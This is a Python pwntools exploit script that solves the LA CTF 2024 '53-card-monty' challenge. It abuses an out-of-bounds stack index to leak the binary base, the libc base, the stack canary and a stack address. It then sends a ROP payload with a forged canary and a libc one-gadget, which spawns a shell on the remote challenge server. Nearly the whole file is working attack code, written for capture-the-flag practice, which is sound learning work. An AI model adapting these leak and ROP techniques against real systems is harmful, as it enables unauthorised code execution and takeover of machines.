#!/usr/bin/env python3

from pwn import *

exe = ELF("./monty_patched")
libc = ELF("./libc_monty.so.6")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, '''
                break *game+814
                ''')
    else:
        r = remote("chall.lac.tf", 31133)

    return r


# NOTE: Used to swap content too
def leak_stack_content(index: int) -> int:
    r.sendlineafter(b"peek? ", f"{index}".encode("ascii"))
    return int(r.recvline()[8:-1])


# https://www.alexyzhang.dev/write-ups/lactf-2024/53-card-monty/
def main():
    r = conn()

    # Swap return address (game+231) of previous call into cards[0]
    # This will align the stack as well, unlike swapping the return address of main directly
    exe.address = leak_stack_content(-3) - (exe.symbols["game"] + 231)
    log.info(f"Binary base address: 0x{exe.address:x}")

    # Swap cards[0] into return address of main (__libc_start_call_main+122)
    libc.address = leak_stack_content(61) - (libc.symbols["__libc_start_call_main"] + 122)
    log.info(f"LIBC base address: 0x{libc.address:x}")

    r.sendlineafter(b"lady! ", b"0")
    r.sendlineafter(b"Name: ", b"asdasd")

    # Leak canary
    canary = leak_stack_content(15)
    log.info(f"Canary: 0x{canary:x}")

    r.sendlineafter(b"lady! ", b"0")
    r.sendlineafter(b"Name: ", b"asdasd")

    # NOTE: See "__libc_start_main_impl" to understand better ("__libc_start_main_impl" == "__libc_start_main" in other LIBCs)
    # "__libc_start_call_main" is marked "_Noreturn",
    # and for some reason the compiler decided to place some code that would normally be executed before
    # the call to __libc_start_call_main after the instruction that does that call.
    # Normal execution would jump from offset +89 to +139, then it would jump from +194 back to +107
    # before calling __libc_start_call_main.
    # When game returns with the stack frame of "__libc_start_call_main", the effect is as if
    # "__libc_start_call_main" returned.
    # Execution would reach the backwards jump and loop back, then "__libc_start_call_main" gets called again,
    # resulting in the program starting from the beginning.

    # Program starts from the beginning again due to the weird loop
    # Swap leftover return address into return address of game
    leak_stack_content(-3)
    leak_stack_content(59)

    r.sendlineafter(b'lady! ', b'0')
    r.sendlineafter(b'Name: ', b'')

    # Leak stack
    stack = leak_stack_content(0)
    log.info(f"Stack address: 0x{stack:x}")

    r.sendlineafter(b'lady! ', b'0')

    payload =  p64(canary)                      # Forged canary
    payload += p64(stack + 0x1d0)               # Set r12 and rbp to stack pointer that points to null
    payload += p64(libc.address + 0xc5295)      # Gadget to clear rdi
    payload += p64(libc.address + 0xde6a2)      # One gadget
    payload += p64(stack + 0x100)               # Overwrite saved rbp to point to the buffer
    r.sendafter(b'Name: ', payload)

    r.interactive("$ ")


if __name__ == "__main__":
    main()
